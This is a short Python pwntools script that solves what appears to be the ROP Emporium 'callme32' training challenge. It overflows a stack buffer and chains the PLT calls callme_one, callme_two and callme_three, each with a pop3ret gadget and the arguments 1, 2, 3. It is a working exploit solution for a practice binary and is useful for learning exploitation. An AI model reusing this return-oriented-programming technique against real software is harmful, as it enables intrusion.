from pwn import *

libc = ELF("./libcallme32.so")
elf = ELF("./callme32")

p = process("./callme32")
#p = remote('localhost', 7777 )


payload = b''
payload += b'A'*0x28
payload += b'BBBB'
payload += p32( elf.plt['callme_one'] ) #callme_one
payload += p32( 0x80488a9 ) #pop3ret
payload += p32( 1 )
payload += p32( 2 )
payload += p32( 3 )
payload += p32( elf.plt['callme_two'] ) #callme_two
payload += p32( 0x80488a9 ) #pop3ret
payload += p32( 1 )
payload += p32( 2 )
payload += p32( 3 )
payload += p32( elf.plt['callme_three'] ) #callme_three
payload += p32( 0x80488a9 ) #pop3ret
payload += p32( 1 )
payload += p32( 2 )
payload += p32( 3 )

print( p.recvuntil("> ") )
p.sendline( payload )

print(p.recv())
